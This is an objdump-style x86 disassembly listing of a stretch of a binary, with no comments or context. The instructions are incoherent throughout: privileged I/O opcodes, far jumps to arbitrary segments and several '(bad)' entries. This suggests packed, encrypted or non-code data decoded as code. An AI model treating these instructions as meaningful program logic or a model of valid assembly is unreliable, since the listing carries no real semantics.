  4040af:	scas   al,BYTE PTR es:[edi]
  4040b0:	inc    eax
  4040b1:	adc    cl,BYTE PTR [ebx-0xa]
  4040b4:	in     eax,0xf1
  4040b6:	sbb    al,0xf5
  4040b8:	or     al,0xab
  4040ba:	les    ebp,FWORD PTR [edi+0x2d9fa1f5]
  4040c0:	mov    dh,0xb
  4040c2:	mov    ebx,0x3c9119e7
  4040c7:	pusha  
  4040c8:	jb     0x40404f
  4040ca:	gs dec ecx
  4040cc:	jmp    0x7627:0x9d3bcc27
  4040d3:	xor    al,0xef
  4040d5:	sub    ah,BYTE PTR [ebx]
  4040d7:	ins    DWORD PTR es:[edi],dx
  4040d8:	sbb    al,0xc8
  4040da:	adc    DWORD PTR [edx+0x10395da3],ebx
  4040e0:	fucomp st(4)
  4040e2:	out    dx,eax
  4040e3:	mov    eax,0xc3caac97
  4040e8:	imul   esi,DWORD PTR [esi],0x2b
  4040eb:	sub    al,0xdc
  4040ed:	les    eax,FWORD PTR [ecx+0x319d2fcb]
  4040f3:	xlat   BYTE PTR ds:[ebx]
  4040f4:	cmp    eax,0x35691d86
  4040f9:	call   0xf1a7:0x6fd2a866
  404100:	imul   ecx,DWORD PTR [ecx+0x521e7b9a],0x6afd97eb
  40410a:	inc    esp
  40410b:	and    DWORD PTR [eax+0x10],esp
  40410e:	rep outs dx,BYTE PTR ds:[esi]
  404110:	cmp    al,0xb2
  404112:	pop    esp
  404113:	jg     0x404178
  404115:	loop   0x404191
  404117:	and    ebp,DWORD PTR [ebp+0x6f]
  40411a:	jmp    0x216b793f
  40411f:	les    eax,FWORD PTR [esi]
  404121:	dec    esi
  404122:	xchg   ebx,eax
  404123:	jmp    0xd176:0x243fda2f
  40412a:	xor    al,cl
  40412c:	xchg   esi,eax
  40412d:	repz jb 0x4040f5
  404130:	jnp    0x4040df
  404132:	arpl   cx,ax
  404134:	cmp    cl,BYTE PTR [esi]
  404136:	and    al,0x58
  404138:	push   edi
  404139:	scas   al,BYTE PTR es:[edi]
  40413a:	mov    ch,0x16
  40413c:	inc    esi
  40413d:	dec    eax
  40413e:	aaa    
  40413f:	pop    edi
  404140:	inc    esi
  404141:	jmp    0xf063:0x7109534e
  404148:	enter  0x12dc,0x67
  40414c:	jns    0x4041c9
  40414e:	aam    0x69
  404150:	mov    ds:0x21cbcd84,al
  404155:	pop    ss
  404156:	std    
  404157:	jo     0x404130
  404159:	xchg   esp,eax
  40415a:	jae    0x4041d4
  40415c:	sbb    edx,DWORD PTR [ebx]
  40415e:	aas    
  40415f:	scas   eax,DWORD PTR es:[edi]
  404160:	push   edx
  404161:	cld    
  404162:	push   es
  404163:	call   0x2d09:0xb4162195
  40416a:	push   esp
  40416b:	das    
  40416c:	mov    ebx,0xfe2a067c
  404171:	jmp    0x756e:0x92c77859
  404178:	rsm    
  40417a:	test   DWORD PTR [ecx],0xc884f993
  404180:	cmp    eax,0xe254a194
  404185:	call   0x4da5b6a9
  40418a:	sti    
  40418b:	mov    al,0x61
  40418d:	jno    0x404138
  40418f:	out    0x44,eax
  404191:	jno    0x4041e7
  404193:	mov    edi,0x1e2d0c1b
  404198:	scas   eax,DWORD PTR es:[edi]
  404199:	test   al,0x76
  40419b:	pop    edx
  40419c:	inc    ebx
  40419d:	rcr    edx,0x12
  4041a0:	dec    ecx
  4041a1:	loop   0x40419c
  4041a3:	mov    BYTE PTR [edi],bl
  4041a5:	mov    esp,0x220a50c7
  4041aa:	jge    0x404140
  4041ac:	test   BYTE PTR [ecx-0x23],ch
  4041af:	fcmovne st,st(4)
  4041b1:	push   0x31cced50
  4041b6:	push   0x25
  4041b8:	arpl   WORD PTR [edx],dx
  4041ba:	add    ebx,ebp
  4041bc:	inc    edx
  4041bd:	fmul   QWORD PTR [esi-0x70554ef2]
  4041c3:	inc    eax
  4041c4:	push   0xfe292d6a
  4041c9:	and    al,BYTE PTR [ecx-0x7103586]
  4041cf:	mov    ebx,0x99441e9
  4041d4:	scas   al,BYTE PTR es:[edi]
  4041d5:	mov    edi,0x609c7439
  4041da:	popf   
  4041db:	aas    
  4041dc:	popf   
  4041dd:	loopne 0x404248
  4041df:	sar    BYTE PTR [eax+0x62bcae40],0xe8
  4041e6:	cli    
  4041e7:	mov    ch,0x5f
  4041e9:	inc    eax
  4041ea:	pop    es
  4041eb:	test   edx,edx
  4041ed:	jp     0x4041c0
  4041ef:	sbb    BYTE PTR [ebx+esi*1+0x14],0x28
  4041f4:	rol    BYTE PTR [ebx+0x39],0x7a
  4041f8:	cmp    al,0x23
  4041fa:	sub    esi,DWORD PTR [edx]
  4041fc:	out    dx,eax
  4041fd:	js     0x404215
  4041ff:	add    al,0x17
  404201:	pop    es
  404202:	jo     0x4041c2
  404204:	mov    ecx,0xf50b94e7
  404209:	ds (bad) 
  40420b:	les    edx,FWORD PTR [ecx+0x33]
  40420e:	call   0x6cf8:0x86b38226
  404215:	xchg   ebp,eax
  404216:	add    eax,0x396b89d5
  40421b:	(bad)  
  40421c:	ror    al,1
  40421e:	add    DWORD PTR [edx+0x54168534],0x3c08afe2
  404228:	jg     0x4041e1
  40422a:	imul   edi,DWORD PTR [ecx+ecx*4],0x17e17fb1
  404231:	and    BYTE PTR [ebx+0x6a],ah
  404234:	lahf   
  404235:	inc    DWORD PTR [si+0x3c]
  404239:	imul   ebp,esi,0x559a98da
  40423f:	xor    BYTE PTR [esi-0x11dd3dca],bl
  404245:	adc    edx,DWORD PTR [eax+0x6c4a56c8]
  40424b:	ins    BYTE PTR es:[edi],dx
  40424c:	enter  0xe0bc,0x59
  404250:	push   cs
  404251:	push   esp
  404252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404253:	adc    dl,ah
  404255:	add    DWORD PTR [edi-0x1098b116],esi
  40425b:	shr    BYTE PTR ds:0x90d800e2,0x83
  404262:	jns    0x4041f6
  404264:	push   ds
  404265:	mov    dh,bh
  404267:	jp     0x4042d7
  404269:	lock in eax,0xe3
  40426c:	add    DWORD PTR [eax+0x55],edi
  40426f:	(bad)  
  404270:	les    ecx,FWORD PTR [ebx]
  404272:	cdq    
  404273:	div    DWORD PTR [ebx-0x3b]
  404276:	lea    edx,[edi]
  404278:	mov    eax,0xc2b427c7
  40427d:	call   0x700a:0x2633ad4f
  404284:	jle    0x404226
  404286:	and    DWORD PTR ds:0x2ff7f0c5,0xfca7dbed
  404290:	add    DWORD PTR [esi-0x104a7ea3],ecx
  404296:	adc    eax,0x1fef3227
  40429b:	stos   BYTE PTR es:[edi],al
  40429c:	pop    edx
  40429d:	enter  0x7805,0x7d
  4042a1:	pop    edx
  4042a2:	and    eax,0xcee9d8f2
  4042a7:	cs push es
  4042a9:	adc    ecx,0xf7156da1
  4042af:	imul   esi,DWORD PTR ds:0x40c69901,0x6527dcab
  4042b9:	xchg   DWORD PTR [edx-0x1f],ecx
  4042bc:	jns    0x404335
  4042be:	xchg   ebx,eax
  4042bf:	dec    ebp
  4042c0:	mov    eax,0x93fbe23
  4042c5:	and    al,0x99
  4042c7:	mov    WORD PTR [edi+ebp*2],?
  4042ca:	push   ds
  4042cb:	jne    0x404280
  4042cd:	sbb    al,0xc9
  4042cf:	or     cl,dl
  4042d1:	in     eax,dx
  4042d2:	add    bh,0xd7
  4042d5:	xor    ch,BYTE PTR [esi-0x7b]
  4042d8:	push   fs
  4042da:	jmp    0x4ca7:0x22fdead1
  4042e1:	mov    WORD PTR [ecx-0x31],?
  4042e4:	sbb    eax,0x1e5c7dd2
  4042e9:	ret    0xdfed
  4042ec:	mov    ebx,0x65424c46
  4042f1:	fwait
  4042f2:	inc    eax
  4042f3:	hlt    
  4042f4:	lods   eax,DWORD PTR ds:[esi]
  4042f5:	daa    
  4042f6:	lahf   
  4042f7:	pop    eax
  4042f8:	sbb    DWORD PTR ds:0xc87d6a8,0x60164fe6
  404302:	push   ebx
  404303:	out    0x1a,eax
  404305:	add    DWORD PTR [ebx-0x683f4494],0xd7d3a866
  40430f:	jle    0x404321
  404311:	test   DWORD PTR [eax],edx
  404313:	cdq    
  404314:	cmp    eax,0x1a5c7f0b
  404319:	xchg   esp,eax
  40431a:	mov    bl,bh
  40431c:	pop    ss
  40431d:	jns    0x40438c
  40431f:	adc    ah,dl
  404321:	inc    esp
  404322:	ficomp DWORD PTR [esi+0x3]
  404325:	aas    
  404326:	call   0xcae07a5e
  40432b:	pop    esp
  40432c:	inc    esi
  40432d:	add    eax,DWORD PTR [edi]
  40432f:	stos   BYTE PTR es:[edi],al
  404330:	and    cl,BYTE PTR [ebx+0x660e6914]
  404336:	dec    eax
  404337:	out    dx,eax
  404338:	mov    ah,ch
  40433a:	mov    ds,WORD PTR [ecx+0x70cfd879]
  404340:	adc    DWORD PTR [ebp-0x35],ecx
  404343:	sub    bh,BYTE PTR [ebx-0x49c2ea71]
  404349:	push   ds
  40434a:	in     al,dx
  40434b:	add    bh,BYTE PTR [edi]
  40434d:	std    
  40434e:	xor    DWORD PTR ds:0xbd1d62c4,esi
  404354:	inc    eax
  404355:	adc    ah,0xd9
  404358:	mov    eax,ds:0x9203fa3f
  40435d:	stos   BYTE PTR es:[edi],al
  40435e:	sbb    ch,cl
  404360:	test   DWORD PTR [eax],esi
  404362:	cmp    edx,esi
  404364:	pop    ss
  404365:	and    ebx,esi
  404367:	test   BYTE PTR [edi+0x5bc84f76],bh
  40436d:	push   eax
  40436e:	mov    eax,0x2a5c6e49
  404373:	dec    edx
  404374:	aaa    
  404375:	mov    ds:0xb21c0c8,eax
  40437a:	cld    
  40437b:	bound  ebp,QWORD PTR [esi-0x6e]
  40437e:	mov    esp,ebx
  404380:	sbb    cl,bh
  404382:	scas   eax,DWORD PTR es:[edi]
  404383:	xor    ecx,DWORD PTR [edx-0x46]
  404386:	jmp    0xdd6a7c22
  40438b:	je     0x404383
  40438d:	int    0x7e
  40438f:	mov    eax,0x477ad7aa
  404394:	sub    eax,0x66c28901
  404399:	cmc    
  40439a:	addr16 mov eax,cs:0xbffa
  40439f:	test   bh,bh
  4043a1:	sbb    DWORD PTR [ebx],edi
  4043a3:	sar    cl,0x63
  4043a6:	out    0xf3,al
  4043a8:	or     esp,DWORD PTR [esi]
  4043aa:	add    bl,BYTE PTR [ecx]
  4043ac:	xchg   DWORD PTR [esi],esi
  4043ae:	inc    ecx
  4043af:	hlt    
  4043b0:	jb     0x40441b
  4043b2:	scas   eax,DWORD PTR es:[edi]
  4043b3:	xor    ecx,DWORD PTR [edi]
  4043b5:	push   ebp
  4043b6:	or     dh,BYTE PTR [eax]
  4043b8:	iret   
  4043b9:	inc    ecx
  4043ba:	pop    ebx
  4043bb:	xchg   ecx,eax
  4043bc:	fldcw  WORD PTR [edi+0x14856183]
  4043c2:	cld    
  4043c3:	xchg   BYTE PTR [ebx],cl
  4043c5:	jo     0x404363
  4043c7:	jnp    0x404384
  4043c9:	inc    edi
  4043ca:	push   ebp
  4043cb:	scas   eax,DWORD PTR es:[edi]
  4043cc:	fist   DWORD PTR [edi]
  4043ce:	pop    edx
  4043cf:	mov    ah,0xdb
  4043d1:	sbb    DWORD PTR ds:0x1a068ca4,ebx
  4043d7:	mov    dh,0xdc
  4043d9:	xchg   cl,cl
  4043db:	pop    edi
  4043dc:	inc    esp
  4043dd:	mov    al,ds:0xb69f98ee
  4043e2:	sahf   
  4043e3:	cmc    
  4043e4:	jp     0x404391
  4043e6:	mov    bh,0xfa
  4043e8:	inc    ebp
  4043e9:	sbb    al,al
  4043eb:	bswap  edi
  4043ed:	pop    ss
  4043ee:	push   esi
  4043ef:	call   0x2b39:0x8c5f34ad
  4043f6:	ds outs dx,BYTE PTR gs:[esi]
  4043f9:	arpl   WORD PTR [eax+0x40],cx
  4043fc:	sub    BYTE PTR [ecx],al
  4043fe:	mov    esp,0xad9d36f8
  404403:	xor    ebx,DWORD PTR [edi]
  404405:	push   edi
  404406:	dec    ecx
  404407:	out    0xd7,eax
  404409:	inc    edx
  40440a:	cmp    bh,bh
  40440c:	mul    BYTE PTR [eax-0x41d64215]
  404412:	or     al,0xf2
  404414:	ret    
  404415:	jo     0x404475
  404417:	push   esp
  404418:	enter  0xfc7,0xba
  40441c:	outs   dx,BYTE PTR ds:[esi]
  40441d:	out    0x73,al
  40441f:	ret    
  404420:	mov    esi,0x514f5bbe
  404425:	push   0x8a517590
  40442a:	inc    ebx
  40442b:	and    dl,dh
  40442d:	dec    ebx
  40442e:	ja     0x404449
  404430:	in     al,dx
  404431:	add    BYTE PTR [eax+0x5daa8af6],al
  404437:	ss pop eax
  404439:	lahf   
  40443a:	cmp    DWORD PTR [ebp-0x29459c7],eax
  404440:	push   0xffffffde
  404442:	out    dx,al
  404443:	mov    al,0x6f
  404445:	out    dx,eax
  404446:	xchg   edx,eax
  404447:	dec    edx
  404448:	mov    edi,0x8eac147a
  40444d:	cld    
  40444e:	js     0x4044a8
  404450:	bound  ecx,QWORD PTR [eax-0x5e2e6905]
  404456:	and    eax,DWORD PTR [edx-0x1a]
  404459:	and    al,0x25
  40445b:	inc    ebx
  40445c:	out    dx,eax
  40445d:	xchg   BYTE PTR [edx+0xe],ch
  404460:	or     al,0x9f
  404462:	iret   
  404463:	int3   
  404464:	rol    ch,1
  404466:	jno    0x404466
  404468:	stc    
  404469:	mov    bx,0xd4f0
  40446d:	xor    eax,0xc0ce52ba
  404472:	jne    0x40445c
  404474:	repnz or DWORD PTR [edi-0x50],esi
  404478:	jle    0x40443a
  40447a:	cmp    eax,0x8075c1c6
  40447f:	retf   0x6851
  404482:	and    DWORD PTR ss:0xf436b3f5,ecx
  404489:	xchg   esi,eax
  40448a:	stos   BYTE PTR es:[edi],al
  40448b:	pusha  
  40448c:	retf   
  40448d:	add    DWORD PTR [esi-0x11276d9b],0x86c2b1bf
  404497:	(bad)  
  404498:	iret   
  404499:	xchg   ebx,eax
  40449a:	(bad)  
  40449b:	test   eax,0x5d15871d
  4044a0:	pand   mm4,QWORD PTR [ecx+0x24]
  4044a4:	inc    esp
  4044a5:	fdivr  QWORD PTR [ebx+0x7]
  4044a8:	cwde   
  4044a9:	cmp    BYTE PTR [eax+0x4a33787f],bl
  4044af:	and    DWORD PTR [edx-0x20520acf],0xfffffff4
  4044b6:	out    dx,al
  4044b7:	push   0xfffffffe
  4044b9:	int    0xcc
  4044bb:	fadd   QWORD PTR [edx+esi*2]
  4044be:	jb     0x4044bd
  4044c0:	cmp    BYTE PTR [ecx-0x612e636a],dl
  4044c6:	add    ch,dl
  4044c8:	cwde   
  4044c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044ca:	inc    ebp
  4044cb:	mov    ch,0xda
  4044cd:	sbb    DWORD PTR [eax+ecx*4+0x48],ebp
  4044d1:	mov    DWORD PTR [edx+0x17005cd2],edx
  4044d7:	mov    esp,0x5fc937d2
  4044dc:	enter  0xe066,0x8b
  4044e0:	and    DWORD PTR [esi-0x18],edx
  4044e3:	mov    ecx,0x7051f031
  4044e8:	jp     0x4044c5
  4044ea:	push   esp
  4044eb:	test   ch,ch
  4044ed:	xor    DWORD PTR [edi-0x3e06af7],esp
  4044f3:	cs dec eax
  4044f5:	add    DWORD PTR [esi],0xccb2fe37
  4044fb:	jmp    0xf7e6974a
  404500:	std    
  404501:	sbb    BYTE PTR [edx+0x23879447],dl
  404507:	mov    ah,0xc8
  404509:	jmp    0x4044b4
  40450b:	popa   
  40450c:	and    al,0x70
  40450e:	mov    al,0xa9
  404510:	pop    esp
  404511:	pop    esp
  404512:	mov    ch,0x6
  404514:	fimul  DWORD PTR [edx+0x687ca705]
  40451a:	jg     0x404529
  40451c:	ret    
  40451d:	sbb    DWORD PTR [edx+0x4],ebp
  404520:	dec    edi
  404521:	mov    eax,ds:0x106b1689
  404526:	aas    
  404527:	out    0xb3,eax
  404529:	xchg   ecx,eax
  40452a:	pop    es
  40452b:	out    0x7,al
  40452d:	inc    ebx
  40452e:	and    al,0xb7
  404530:	jp     0x4044c3
  404532:	mov    edi,0xd13fcf5e
  404537:	fst    QWORD PTR [eax-0x2d12da1a]
  40453d:	ins    DWORD PTR es:[edi],dx
  40453e:	fs fsubp st(1),st
  404541:	mov    esi,0x20a8be75
  404546:	les    edx,FWORD PTR ds:0xab27ace7
  40454c:	xchg   ebx,eax
  40454d:	fild   QWORD PTR [edi+0x3a9129b8]
  404553:	sub    ebx,DWORD PTR [esi+0x33827c71]
  404559:	outs   dx,DWORD PTR ds:[esi]
  40455a:	mov    eax,0xdacec012
  40455f:	stos   BYTE PTR es:[edi],al
  404560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404561:	dec    eax
  404562:	fiadd  DWORD PTR [ecx+ebx*8+0x7c267baa]
  404569:	repz in eax,0x37
  40456c:	push   esp
  40456d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40456f:	aaa    
  404570:	shr    ebx,cl
  404572:	jno    0x4045ee
  404574:	call   0x1301:0xeb1c76a6
  40457b:	js     0x4045b5
  40457d:	inc    ebp
  40457e:	mov    ch,0x7e
  404580:	ins    BYTE PTR es:[edi],dx
  404581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404582:	call   DWORD PTR [ebp+0xb]
  404585:	jle    0x404591
  404587:	test   dh,bh
  404589:	mov    eax,ds:0xddfb2a45
  40458e:	mov    eax,ds:0xb198d30e
  404593:	xchg   esp,eax
  404594:	add    eax,DWORD PTR [esi-0x21d97331]
  40459a:	or     ecx,DWORD PTR [eax+0x32]
  40459d:	jg     0x4045ff
  40459f:	int    0x4a
  4045a1:	cvtps2pd xmm5,QWORD PTR [edx-0x500212fb]
  4045a8:	ret    
  4045a9:	pop    ebx
  4045aa:	es add eax,0xd0579623
  4045b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b1:	jmp    0x4045c0
  4045b3:	or     esp,DWORD PTR [edx]
  4045b5:	test   DWORD PTR [edx],edi
  4045b7:	inc    eax
  4045b8:	inc    DWORD PTR [esp+edx*2-0x1b2089cc]
  4045bf:	jp     0x4045e3
  4045c1:	je     0x404548
  4045c3:	mov    ch,BYTE PTR [esi-0x37]
  4045c6:	mov    eax,ds:0x12cc862a
  4045cb:	mov    esp,0xeff6a0d1
  4045d0:	and    ah,BYTE PTR [ecx]
  4045d2:	iret   
  4045d3:	xor    ecx,ebp
  4045d5:	jp     0x4045f2
  4045d7:	sbb    DWORD PTR [ebp+0x1a],esi
  4045da:	stos   DWORD PTR es:[edi],eax
  4045db:	mov    ds:0x9a70c26e,al
  4045e0:	(bad)  
  4045e1:	mov    ah,0x8a
  4045e3:	ss jmp 0x4045d4
  4045e6:	push   ebp
  4045e7:	aam    0x24
  4045e9:	jl     0x4045a7
  4045eb:	popf   
  4045ec:	sub    al,0xd6
  4045ee:	add    eax,0xddcc785f
  4045f3:	lds    edi,FWORD PTR [esi-0x1f18f9d]
  4045f9:	not    ah
  4045fb:	xchg   ebp,ecx
  4045fd:	adc    DWORD PTR [esi+0x7b],esi
  404600:	std    
  404601:	xchg   edi,eax
  404602:	push   esi
  404603:	xchg   ebx,eax
  404604:	ror    DWORD PTR [eax+edx*8],1
  404607:	jae    0x40465e
  404609:	and    al,ah
  40460b:	mov    ecx,0x4b209024
  404610:	adc    eax,0x9c8d6f31
  404615:	into   
  404616:	xor    eax,0x8ff2c5cd
  40461b:	test   eax,0x44967aee
  404620:	xchg   edx,eax
  404621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404622:	push   ecx
  404623:	les    edi,FWORD PTR [ecx]
  404625:	or     DWORD PTR [ebx-0x3dd8aebf],ebx
  40462b:	xchg   ebx,eax
  40462c:	dec    esp
  40462d:	mov    WORD PTR [eax+0x50fffb9e],fs
  404633:	sbb    DWORD PTR [eax+0x7b],edi
  404636:	popf   
  404637:	test   ch,bl
  404639:	mov    ecx,0xf8288ae5
  40463e:	enter  0xd212,0xb6
  404642:	loope  0x4045eb
  404644:	and    DWORD PTR [ebx+0x6d],esi
  404647:	jbe    0x4045ca
  404649:	pop    ebx
  40464a:	xor    al,0x2b
  40464c:	test   al,0xb4
  40464e:	mov    ebp,0x5249511b
  404653:	dec    ebp
  404654:	bound  ebx,QWORD PTR [eax-0x72]
  404657:	icebp  
  404658:	(bad)  
  404659:	es inc eax
  40465b:	dec    esp
  40465c:	or     eax,0xc11c17ef
  404661:	lea    esi,[eax]
  404663:	sar    DWORD PTR [edi+0x52e5bb1b],1
  404669:	sub    eax,0xb4340d56
  40466e:	add    eax,esp
  404670:	cli    
  404671:	push   edi
  404672:	mov    dh,0x5d
  404674:	or     DWORD PTR [ecx+0x37],eax
  404677:	mov    ebp,0xb26dcdb0
  40467c:	fimul  DWORD PTR [esi+0x63b984d]
  404682:	shl    BYTE PTR [edi],cl
  404684:	out    0xbb,eax
  404686:	mov    ebx,0xf06704fb
  40468b:	inc    edi
  40468c:	push   ebp
  40468d:	test   BYTE PTR [esi-0x73e3edce],cl
  404693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404694:	sahf   
  404695:	xor    al,0xbc
  404697:	dec    eax
  404698:	and    al,0x6d
  40469a:	popf   
  40469b:	nop
  40469c:	out    dx,al
  40469d:	sbb    bl,BYTE PTR [esp+ebx*2+0x2b]
  4046a1:	std    
  4046a2:	pop    eax
  4046a3:	lods   eax,DWORD PTR ds:[esi]
  4046a4:	xchg   BYTE PTR [eax],cl
  4046a6:	xor    eax,0x8afe6cf6
  4046ab:	stos   BYTE PTR es:[edi],al
  4046ac:	stos   DWORD PTR es:[edi],eax
  4046ad:	ror    BYTE PTR [ebp+0x46b4d4b3],cl
  4046b3:	imul   esp,DWORD PTR [edx],0x28
  4046b6:	sbb    DWORD PTR [ebp+0x438b6cec],esp
  4046bc:	aad    0x4b
  4046be:	cli    
  4046bf:	ds mov bl,0x2e
  4046c2:	outs   dx,BYTE PTR ds:[esi]
  4046c3:	fmul   QWORD PTR [ebp+0x11]
  4046c6:	dec    ebp
  4046c7:	loope  0x40467c
  4046c9:	lea    edi,[ebp+edi*4-0x73]
  4046cd:	popa   
  4046ce:	out    dx,eax
  4046cf:	dec    eax
  4046d0:	ror    BYTE PTR [esi],1
  4046d2:	(bad)  
  4046d3:	sbb    eax,0x31b59aa9
  4046d8:	adc    edx,ecx
  4046da:	mov    gs,esi
  4046dc:	outs   dx,DWORD PTR ds:[esi]
  4046dd:	gs jnp 0x4046cf
  4046e0:	sbb    DWORD PTR [ebx],edi
  4046e2:	and    edx,edx
  4046e4:	sub    DWORD PTR [ebx],edx
  4046e6:	or     BYTE PTR [edi-0x63],cl
  4046e9:	in     eax,0xa5
  4046eb:	nop
  4046ec:	inc    BYTE PTR [bx+di-0x5550]
  4046f1:	and    BYTE PTR [edi-0x23],ch
  4046f4:	sbb    ebp,DWORD PTR [edx+0x21]
  4046f7:	pusha  
  4046f8:	cmp    eax,DWORD PTR [ebp-0x474ab535]
  4046fe:	imul   eax,esp,0xf32c42fc
  404704:	xor    eax,0x5635d2f7
  404709:	out    0xf5,al
  40470b:	leave  
  40470c:	or     eax,esp
  40470e:	mov    esp,0x4725646
  404713:	(bad)
  404716:	mov    dl,0x27
  404718:	out    dx,eax
  404719:	mov    edi,DWORD PTR [edi-0x5a92764a]
  40471f:	jmp    0xa441:0x8866656
  404726:	xchg   ebp,eax
  404727:	jae    0x4046ae
  404729:	jle    0x4046bc
  40472b:	push   edi
  40472c:	mov    bl,0x63
  40472e:	popf   
  40472f:	xchg   edx,eax
  404730:	(bad)  
  404731:	adc    ch,BYTE PTR [esi+0x6f50b27d]
  404737:	fst    QWORD PTR [ecx]
  404739:	imul   esi,DWORD PTR [eax+0x75b44a57],0x1ffb73bf
  404743:	pop    esp
  404744:	outs   dx,BYTE PTR ds:[esi]
  404745:	outs   dx,DWORD PTR ds:[esi]
  404746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404747:	mov    DWORD PTR [edi],edx
  404749:	in     al,0xac
  40474b:	xor    eax,0x22401cb8
  404750:	jp     0x40472c
  404752:	ror    esi,1
  404754:	jg     0x40479c
  404756:	test   BYTE PTR [ebp+edi*1+0x5672714c],dh
  40475d:	inc    eax
  40475e:	push   edi
  40475f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404760:	mov    ah,0x6e
  404762:	and    al,0x3a
  404764:	inc    eax
  404765:	cmp    eax,0xb6a43155
  40476a:	dec    eax
  40476b:	push   0x9939c5a
  404770:	(bad)  
  404771:	push   edx
  404772:	(bad)  
  404773:	stc    
  404774:	cld    
  404775:	cli    
  404776:	cmp    eax,DWORD PTR [ebp-0x44316b87]
  40477c:	or     ebp,ecx
  40477e:	mov    eax,0x8d74804e
  404783:	repz jl 0x43b4bfae
  40478a:	call   0xd1fcbbb
  40478f:	sbb    edx,esi
  404791:	imul   ebp,DWORD PTR [esi-0x1d961910],0xffffffa0
  404798:	lock and edi,DWORD PTR [esi+0x4b27ee6d]
  40479f:	inc    esp
  4047a0:	or     ebx,esi
  4047a2:	mov    cl,0x99
  4047a4:	cmp    eax,0xbbde38c5
  4047a9:	xor    DWORD PTR [ecx-0x76303d3e],ebp
  4047af:	outs   dx,DWORD PTR ds:[esi]
  4047b0:	je     0x404736
  4047b2:	cs in  eax,0xb5
  4047b5:	jne    0x4047f5
  4047b7:	cmp    DWORD PTR [ebx],edi
  4047b9:	or     dh,bh
  4047bb:	repnz mov esp,0x95f5d5d7
  4047c1:	addr16 cmc 
  4047c3:	popf   
  4047c4:	mul    DWORD PTR [ecx]
  4047c6:	pop    es
  4047c7:	cmc    
  4047c8:	enter  0xa4d8,0x87
  4047cc:	and    DWORD PTR [ecx+edx*8],0xb6c2e89d
  4047d3:	xlat   BYTE PTR ds:[ebx]
  4047d4:	jmp    0x404762
  4047d6:	popa   
  4047d7:	mov    eax,ds:0x22104174
  4047dc:	or     DWORD PTR [edi+0x1d],esp
  4047df:	jo     0x404837
  4047e1:	push   0x7f
  4047e3:	outs   dx,DWORD PTR ds:[esi]
  4047e4:	inc    esi
  4047e5:	in     al,dx
  4047e6:	xor    al,0x40
  4047e8:	push   edx
  4047e9:	inc    esp
  4047ea:	pop    es
  4047eb:	outs   dx,DWORD PTR ds:[esi]
  4047ec:	or     eax,DWORD PTR [edi]
  4047ee:	sbb    eax,DWORD PTR [esi-0x6f456bbd]
  4047f4:	dec    edi
  4047f5:	mov    bl,0x45
  4047f7:	jle    0x404795
  4047f9:	leave  
  4047fa:	mov    edx,0xebf89c24
  4047ff:	xchg   ebp,eax
  404800:	adc    BYTE PTR [ecx],bl
  404802:	jne    0x404805
  404804:	add    al,0x34
  404806:	mov    ds:0xf1191ea,eax
  40480b:	mov    eax,ds:0xb240bc35
  404810:	sub    ch,cl
  404812:	inc    esp
  404813:	xchg   esp,eax
  404814:	cmp    BYTE PTR [eax-0x2f],bl
  404817:	out    dx,eax
  404818:	add    ebp,DWORD PTR [ecx+eiz*2+0x2c]
  40481c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40481d:	jo     0x40486e
  40481f:	xchg   ebp,eax
  404820:	sbb    bh,BYTE PTR [eax+0xec77532]
  404826:	mov    eax,0xe5d0dd41
  40482b:	call   0x84e9:0x8b7741f8
  404832:	imul   eax,esp,0x2c
  404835:	lds    edx,FWORD PTR [ecx+0x3]
  404838:	push   eax
  404839:	(bad)  
  40483a:	loopne 0x40480e
  40483c:	(bad)  
  40483d:	sub    esi,DWORD PTR [eax+0x7a]
  404840:	and    BYTE PTR [edi],ch
  404842:	adc    al,0x4a
  404844:	inc    eax
  404845:	wbinvd 
  404847:	outs   dx,DWORD PTR ds:[esi]
  404848:	or     BYTE PTR [ebx],0x2e
  40484b:	out    dx,eax
  40484c:	inc    esp
  40484d:	inc    esp
  40484e:	jl     0x4047e2
  404850:	aam    0x3f
  404852:	neg    BYTE PTR [ecx-0xfb63468]
  404858:	pushf  
  404859:	outs   dx,DWORD PTR ds:[esi]
  40485a:	sbb    eax,0xe1bca26c
  40485f:	call   0x80ca:0x5ce5196e
  404866:	cmp    dh,0x87
  404869:	push   esp
  40486a:	(bad)  
  40486b:	pop    eax
  40486c:	retf   0xac74
  40486f:	in     al,0x82
  404871:	mov    esi,0xad3cc850
  404876:	enter  0xc2e7,0x4c
  40487a:	xor    al,0x4e
  40487c:	inc    edi
  40487d:	popa   
  40487e:	imul   esp,DWORD PTR [edi-0x37],0xffffff9a
  404882:	stos   BYTE PTR es:[edi],al
  404883:	cmp    al,0x3e
  404885:	jbe    0x4048f4
  404887:	pop    ebx
  404888:	mov    edi,0x7b863434
  40488d:	cdq    
  40488e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488f:	adc    DWORD PTR [ebx],0x3e0f0cca
  404895:	sbb    al,BYTE PTR [eax-0x13]
  404898:	ret    0x2aa7
  40489b:	jmp    0x4048a3
  40489d:	xchg   edi,eax
  40489e:	pop    edi
  40489f:	mov    ds:0x6882b6c9,al
  4048a4:	jecxz  0x404849
  4048a6:	call   0xc0c6c8d
  4048ab:	ins    BYTE PTR es:[edi],dx
  4048ac:	(bad)  
  4048ad:	jmp    0x404909
  4048af:	loope  0x40488c
  4048b1:	test   al,0xa6
  4048b3:	dec    ecx
  4048b4:	push   esi
  4048b5:	push   ebp
  4048b6:	add    al,0xdb
  4048b8:	into   
  4048b9:	xor    edx,ebp
  4048bb:	adc    ebp,ebx
  4048bd:	test   al,0x6c
  4048bf:	(bad)  
  4048c0:	cmc    
  4048c1:	fcmovb st,st(6)
  4048c3:	mov    eax,0x975a58fb
  4048c8:	push   esp
  4048c9:	test   al,0x60
  4048cb:	sbb    dh,BYTE PTR [ecx]
  4048cd:	adc    DWORD PTR [esi+0x6965f65b],0x78
  4048d4:	jne    0x4048fc
